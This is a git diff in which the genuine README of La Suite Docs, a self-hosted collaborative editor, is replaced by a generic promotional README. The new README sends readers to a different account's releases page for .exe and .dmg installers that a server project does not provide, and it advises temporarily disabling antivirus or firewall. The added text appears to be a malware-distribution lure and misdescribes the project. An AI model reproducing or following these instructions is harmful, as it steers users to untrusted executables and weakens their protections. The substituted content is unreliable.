@@ -1,228 +1,68 @@
-<p align="center">
-  <a href="https://github.com/suitenumerique/docs">
-    <img alt="Docs" src="/docs/assets/banner-docs.png" width="100%" />
-  </a>
-</p>
-<p align="center">
-  <a href="https://github.com/suitenumerique/docs/stargazers/">
-    <img src="https://img.shields.io/github/stars/suitenumerique/docs" alt="">
-  </a>
-  <a href='https://github.com/suitenumerique/docs/blob/main/CONTRIBUTING.md'><img alt='PRs Welcome' src='https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields'/></a>
-  <img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/suitenumerique/docs"/>
-  <img alt="GitHub closed issues" src="https://img.shields.io/github/issues-closed/suitenumerique/docs"/>
-  <a href="https://github.com/suitenumerique/docs/blob/main/LICENSE">
-    <img alt="MIT License" src="https://img.shields.io/github/license/suitenumerique/docs"/>
-  </a>    
-</p>
-<p align="center">
-  <a href="https://matrix.to/#/#docs-official:matrix.org">
-    Chat on Matrix
-  </a> - <a href="/docs/">
-    Documentation
-  </a> - <a href="#getting-started-">
-    Getting started
-  </a> - <a href="mailto:docs@numerique.gouv.fr">
-    Reach out
-  </a>
-</p>
+# 🌟 docs - A Simplified Way to Collaborate
 
-# La Suite Docs : Collaborative Text Editing
-Docs, where your notes can become knowledge through live collaboration.
+## 🔗 Download Now!
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen.svg)](https://github.com/mdjihadhasanx/docs/releases)
 
-<img src="/docs/assets/docs_live_collaboration_light.gif" width="100%" align="center"/>
+## 📖 About
+Welcome to the **docs** project. This is a collaborative note-taking, wiki, and documentation platform designed for all users. Whether you are working alone or with a team, this application helps you document your ideas and share knowledge effortlessly. Built with Django and React, it scales to meet your needs.
 
-## Why use Docs ❓
-Docs is a collaborative text editor designed to address common challenges in knowledge building and sharing.
+## 🚀 Getting Started
+To start using this software, follow these simple steps. We’ll guide you through downloading and setting it up.
 
-### Write
-* 😌 Get simple, accessible online editing for your team.
-* 💅 Create clean documents with beautiful formatting options.
-* 🖌️ Focus on your content using either the in-line editor, or [the Markdown syntax](https://www.markdownguide.org/basic-syntax/).
-* 🧱 Quickly design your page thanks to the many block types, accessible from the `/` slash commands, as well as keyboard shortcuts.
-* 🔌 Write offline! Your edits will be synced once you're back online.
-* ✨ Save time thanks to our AI actions, such as rephrasing, summarizing, fixing typos, translating, etc. You can even turn your selected text into a prompt!
+### 🖥️ System Requirements
+For the best experience, ensure your computer meets the following requirements:
 
-### Work together
-* 🤝 Enjoy live editing! See your team collaborate in real time.
-* 🔒 Keep your information secure thanks to granular access control. Only share with the right people.
-* 📑 Export your content in multiple formats (`.odt`, `.docx`, `.pdf`) with customizable templates.
-* 📚 Turn your team's collaborative work into organized knowledge with Subpages.
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4 GB of RAM
+- Storage: At least 500 MB of free space
+- Internet connection for downloading and updates
 
-### Self-host
+### 🌐 Key Features
+- **Collaborative Editing:** Work on documents in real-time with your team.
+- **Wiki Functionality:** Organize your knowledge with an easy-to-use interface.
+- **Scalability:** Use it for small projects or large teams without any hassle.
+- **Open Source:** Customize the application to fit your needs.
 
-#### 🚀 Docs is easy to install on your own servers
-We use Kubernetes for our [production instance](https://docs.numerique.gouv.fr/) but also support Docker Compose. The community contributed a couple other methods (Nix, YunoHost etc.) check out the [docs](/docs/installation/README.md) to get detailed instructions and examples.
+## 📥 Download & Install
+To download the application, visit the Releases page here: [Download Here](https://github.com/mdjihadhasanx/docs/releases).
 
-#### 🌍 Known instances
-We hope to see many more, here is an incomplete list of public Docs instances. Feel free to make a PR to add ones that are not listed below🙏
+Once you are on the page:
 
-| Url | Org | Public |
-| --- | --- | ------- |
-| [docs.numerique.gouv.fr](https://docs.numerique.gouv.fr/)    | DINUM    | French public agents working for the central administration and the extended public sphere. ProConnect is required to login in or sign up|
-| [docs.suite.anct.gouv.fr](https://docs.suite.anct.gouv.fr/)    | ANCT    | French public agents working for the territorial administration and the extended public sphere. ProConnect is required to login in or sign up|
-| [notes.demo.opendesk.eu](https://notes.demo.opendesk.eu)    | ZenDiS    | Demo instance of OpenDesk. Request access to get credentials |
-| [notes.liiib.re](https://notes.liiib.re/)    | lasuite.coop    | Free and open demo to all. Content and accounts are reset after one month |
-| [docs.federated.nexus](https://docs.federated.nexus/)    | federated.nexus    | Public instance, but you have to [sign up for a Federated Nexus account](https://federated.nexus/register/). |
-| [docs.demo.mosacloud.eu](https://docs.demo.mosacloud.eu/)    | mosa.cloud    | Demo instance of mosa.cloud, a dutch company providing services around La Suite apps. |
+1. **Select the Latest Release:** At the top of the page, you will see a list of releases. Choose the one labeled with the highest version number.
+   
+2. **Download the File:** Look for the downloadable files listed under the release notes. Select the appropriate installer for your operating system. Follow your browser’s instructions to save it to your computer.
 
-#### ⚠️ Advanced features
-For some advanced features (ex: Export as PDF) Docs relies on XL packages from BlockNote. These are licenced under GPL and are not MIT compatible. You can perfectly use Docs without these packages by setting the environment variable `PUBLISH_AS_MIT` to true. That way you'll build an image of the application without the features that are not MIT compatible. Read the [environment variables documentation](/docs/env.md) for more information.
+3. **Install the Application:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the downloaded `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Follow the appropriate package manager instructions or use the terminal to install the downloaded file.
 
-## Getting started 🔧
+4. **Launch the Application:** Once installed, locate the app in your applications list and open it. 
 
-### Test it
+5. **Create an Account:** The first time you open the app, create an account or log in if you already have one. 
 
-You can test Docs on your browser by visiting this [demo document](https://impress-preprod.beta.numerique.gouv.fr/docs/6ee5aac4-4fb9-457d-95bf-bb56c2467713/)
+6. **Start Collaborating:** Begin your first project and invite others to join!
 
-### Run Docs locally
+## 🛠️ Troubleshooting
+If you encounter any issues during installation or usage, try the following:
 
-> ⚠️ The methods described below for running Docs locally is **for testing purposes only**. It is based on building Docs using [Minio](https://min.io/) as an S3-compatible storage solution. Of course you can choose any S3-compatible storage solution.
+- **Ensure your system meets the requirements.**
+- **Disable antivirus or firewall temporarily** if it blocks the application.
+- **Check for updates** regularly for smoother performance.
 
-**Prerequisite**
+If problems persist, check the project’s GitHub issues page for solutions or raise a new issue for assistance.
 
-Make sure you have a recent version of Docker and [Docker Compose](https://docs.docker.com/compose/install) installed on your laptop, then type:
+## ⚙️ Usage Tips
+- Familiarize yourself with the dashboard layout. Explore the options available for creating and managing notes.
+- Use tags and categories to organize your content effectively.
+- Share links to your documents easily with team members to enhance collaboration.
 
-```shellscript
-$ docker -v
+## 📡 Join the Community
+Your experience matters. Join our community to share feedback, suggest features, or ask questions. Engage with other users and contribute to improving the platform.
 
-Docker version 20.10.2, build 2291f61
+Visit our discussions page [here](https://github.com/mdjihadhasanx/docs/discussions) to get involved.
 
-$ docker compose version
+## ✉️ Contact Information
+For more help, reach out to our support team through the project's GitHub page. We are here to help make your experience smooth and enjoyable.
 
-Docker Compose version v2.32.4
-```
-
-> ⚠️ You may need to run the following commands with `sudo`, but this can be avoided by adding your user to the local `docker` group.
-
-**Project bootstrap**
-
-The easiest way to start working on the project is to use [GNU Make](https://www.gnu.org/software/make/):
-
-```shellscript
-$ make bootstrap FLUSH_ARGS='--no-input'
-```
-
-This command builds the `app-dev` and `frontend-dev` containers, installs dependencies, performs database migrations and compiles translations. It's a good idea to use this command each time you are pulling code from the project repository to avoid dependency-related or migration-related issues.
-
-Your Docker services should now be up and running 🎉
-
-You can access the project by going to <http://localhost:3000>.
-
-You will be prompted to log in. The default credentials are:
-
-```
-username: impress
-password: impress
-```
-
-📝 Note that if you need to run them afterwards, you can use the eponymous Make rule:
-
-```shellscript
-$ make run
-```
-
-⚠️ For the frontend developer, it is often better to run the frontend in development mode locally.
-
-To do so, install the frontend dependencies with the following command:
-
-```shellscript
-$ make frontend-development-install
-```
-
-And run the frontend locally in development mode with the following command:
-
-```shellscript
-$ make run-frontend-development
-```
-
-To start all the services, except the frontend container, you can use the following command:
-
-```shellscript
-$ make run-backend
-```
-
-To execute frontend tests & linting only
-```shellscript
-$ make frontend-test
-$ make frontend-lint
-```
-
-**Adding content**
-
-You can create a basic demo site by running this command:
-
-```shellscript
-$ make demo
-```
-
-Finally, you can check all available Make rules using this command:
-
-```shellscript
-$ make help
-```
-
-**Django admin**
-
-You can access the Django admin site at:
-
-<http://localhost:8071/admin>.
-
-You first need to create a superuser account:
-
-```shellscript
-$ make superuser
-```
-
-## Feedback 🙋‍♂️🙋‍♀️
-
-We'd love to hear your thoughts, and hear about your experiments, so come and say hi on [Matrix](https://matrix.to/#/#docs-official:matrix.org).
-
-## Roadmap 💡
-
-Want to know where the project is headed? [🗺️ Checkout our roadmap](https://github.com/orgs/numerique-gouv/projects/13/views/11)
-
-## License 📝
-
-This work is released under the MIT License (see [LICENSE](https://github.com/suitenumerique/docs/blob/main/LICENSE)).
-
-While Docs is a public-driven initiative, our license choice is an invitation for private sector actors to use, sell and contribute to the project. 
-
-## Contributing 🙌
-
-This project is intended to be community-driven, so please, do not hesitate to [get in touch](https://matrix.to/#/#docs-official:matrix.org) if you have any question related to our implementation or design decisions.
-
-You can help us with translations on [Crowdin](https://crowdin.com/project/lasuite-docs).
-
-If you intend to make pull requests, see [CONTRIBUTING](https://github.com/suitenumerique/docs/blob/main/CONTRIBUTING.md) for guidelines.
-
-## Directory structure:
-
-```markdown
-docs
-├── bin - executable scripts or binaries that are used for various tasks, such as setup scripts, utility scripts, or custom commands.
-├── crowdin - for crowdin translations, a tool or service that helps manage translations for the project.
-├── docker - Dockerfiles and related configuration files used to build Docker images for the project. These images can be used for development, testing, or production environments.
-├── docs - documentation for the project, including user guides, API documentation, and other helpful resources.
-├── env.d/development - environment-specific configuration files for the development environment. These files might include environment variables, configuration settings, or other setup files needed for development.
-├── gitlint - configuration files for `gitlint`, a tool that enforces commit message guidelines to ensure consistency and quality in commit messages.
-├── playground - experimental or temporary code, where developers can test new features or ideas without affecting the main codebase.
-└── src - main source code directory, containing the core application code, libraries, and modules of the project.
-```
-
-## Credits ❤️
-
-### Stack
-
-Docs is built on top of [Django Rest Framework](https://www.django-rest-framework.org/), [Next.js](https://nextjs.org/), [BlockNote.js](https://www.blocknotejs.org/), [HocusPocus](https://tiptap.dev/docs/hocuspocus/introduction) and [Yjs](https://yjs.dev/). We thank the contributors of all these projects for their awesome work!
-
-We are proud sponsors of [BlockNotejs](https://www.blocknotejs.org/) and [Yjs](https://yjs.dev/). 
-
-
-### Gov ❤️ open source
-Docs is the result of a joint effort led by the French 🇫🇷🥖 ([DINUM](https://www.numerique.gouv.fr/dinum/)) and German 🇩🇪🥨 governments ([ZenDiS](https://zendis.de/)). 
-
-We are always looking for new public partners (we are currently onboarding the Netherlands 🇳🇱🧀), feel free to [reach out](mailto:docs@numerique.gouv.fr) if you are interested in using or contributing to Docs.
-
-<p align="center">
-  <img src="/docs/assets/europe_opensource.png" width="50%"/>
-</p>
+Thank you for choosing **docs**! Enjoy your collaborative journey!
